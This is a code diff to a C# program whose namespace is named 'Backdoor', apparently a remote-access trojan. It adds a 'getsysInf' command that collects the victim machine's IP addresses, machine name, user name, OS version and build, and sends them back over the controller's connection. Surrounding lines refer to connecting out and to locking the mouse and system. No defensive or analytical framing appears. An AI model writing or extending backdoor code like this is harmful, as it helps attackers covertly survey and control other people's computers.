@@ -253,6 +253,26 @@ namespace Backdoor
                         Connect();
                         break;
                     }
+                    if (data.StartsWith("getsysInf"))
+                    {
+                        data = data.Remove(0, 11);
+                        string comm = ParseComand(data);
+                        if (comm.StartsWith("true"))
+                        {
+                            comm = comm.Remove(0, 5);
+                            conn.Send(Encoding.UTF8.GetBytes(executor.GetSystemInformation()));
+                            continue;
+                        }
+                        if (comm.StartsWith("false"))
+                        {
+                            conn.Send(Encoding.UTF8.GetBytes(executor.GetSystemInformation()));
+                            continue;
+                        }
+                        else
+                        {
+                            throw new Exception("информация системы: неверный аргумент");
+                        }
+                    }
                 }
                 catch (Exception e)
                 {
@@ -506,6 +526,20 @@ namespace Backdoor
                 }
             }
             LockMouse();
+        }
+        public string GetSystemInformation()
+        {
+            string str = "нету ip";
+            for (int i = 0; i < Dns.GetHostByName(Dns.GetHostName()).AddressList.Length; i++) str += Dns.GetHostByName(Dns.GetHostName()).AddressList[i];
+            return 
+$@"<sysInf> 
+<ip>{str}</ip> 
+<time>{DateTime.Now}</time>
+<machineName>{Environment.MachineName}</machineName> 
+<usName>{Environment.UserName}</usName> 
+<buildNum>{Environment.Version.Build}</buildNum> 
+<sys>{Environment.OSVersion}</sys> 
+</sysInf>";
         }
         public void UnLockSystem()
         {
